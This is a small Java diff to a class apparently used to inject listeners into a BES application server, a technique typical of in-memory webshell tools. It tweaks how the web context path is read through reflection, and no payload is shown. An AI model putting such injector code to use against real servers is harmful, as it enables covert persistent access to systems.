@@ -15,7 +15,7 @@ import java.util.zip.GZIPInputStream;
  */
 public class BesListenerInjector {
 
-    private String msg = "";
+    private static String msg = "";
     private static boolean ok = false;
 
     public String getClassName() {
@@ -58,7 +58,7 @@ public class BesListenerInjector {
     private String getContextRoot(Object context) {
         String r = null;
         try {
-            r = (String) invokeMethod(context, "getContextPath", null, null);
+            r = (String) getFieldValue(context, "encodedPath");
         } catch (Exception ignored) {
         }
         String c = context.getClass().getName();
